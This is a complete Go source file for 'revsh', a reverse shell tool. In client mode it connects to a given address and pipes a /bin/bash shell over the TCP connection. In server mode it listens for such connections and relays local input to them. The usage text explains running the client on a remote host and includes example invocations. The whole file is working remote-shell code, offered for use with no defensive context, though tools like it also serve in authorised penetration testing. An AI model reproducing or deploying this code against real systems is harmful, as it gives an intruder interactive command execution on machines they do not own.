package main

import "flag"
import "fmt"
import "io"
import "log"
import "net"
import "os"
import "os/exec"

// When isServer is true, revsh is in server mode. Otherwise it is in client
// mode.
var isServer bool

func init() {
	flag.BoolVar(&isServer, "l", false, "Listen for incoming connections.")
	flag.Usage = usage
}

func usage() {
	fmt.Fprintln(os.Stderr, "Usage: revsh [OPTION]... ADDR")
	fmt.Fprintln(os.Stderr, "Establish a reverse shell connection using two modes.")
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, "The client mode (default) executes a shell and pipes it's I/O to ADDR.")
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, `The server mode ("-l" flag) binds incoming connections on ADDR with standard input.`)
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, "Usually the server mode is used at a local host while the client mode is used at a remote host.")
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, "Flags:")
	fmt.Fprintln(os.Stderr)
	flag.PrintDefaults()
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, "Examples:")
	fmt.Fprintln(os.Stderr, "  Listen on port 1234.")
	fmt.Fprintln(os.Stderr, "    revsh -l :1234")
	fmt.Fprintln(os.Stderr, `  Connect to server at "example.org" on port 1234.`)
	fmt.Fprintln(os.Stderr, "    revsh example.org:1234")
}

func main() {
	flag.Parse()
	if flag.NArg() != 1 {
		flag.Usage()
		os.Exit(1)
	}
	addr := flag.Arg(0)
	if isServer {
		err := listen(addr)
		if err != nil {
			log.Fatalln(err)
		}
	} else {
		err := connect(addr)
		if err != nil {
			log.Fatalln(err)
		}
	}
}

// listen listens for incoming connections and pipes all input and output
// through the connection.
func listen(addr string) (err error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	conn, err := ln.Accept()
	if err != nil {
		return err
	}
	log.Println("accepted connection from:", conn.RemoteAddr())
	errc := make(chan error)
	go goCopy(conn, os.Stdin, errc)
	go goCopy(os.Stdout, conn, errc)
	for i := 0; i < 2; i++ {
		err := <-errc
		if err != nil {
			return err
		}
	}
	return nil
}

// goCopy copies from src to dst until either io.EOF is reached on src or an
// error occurs. The error value is sent on the provided errc channel.
func goCopy(dst io.Writer, src io.Reader, errc chan<- error) {
	_, err := io.Copy(dst, src)
	errc <- err
}

// connect connects to a remote address, executes a shell and pipes all input
// and output through the connection.
func connect(addr string) (err error) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	err = cmd.Run()
	if err != nil {
		return err
	}
	return nil
}
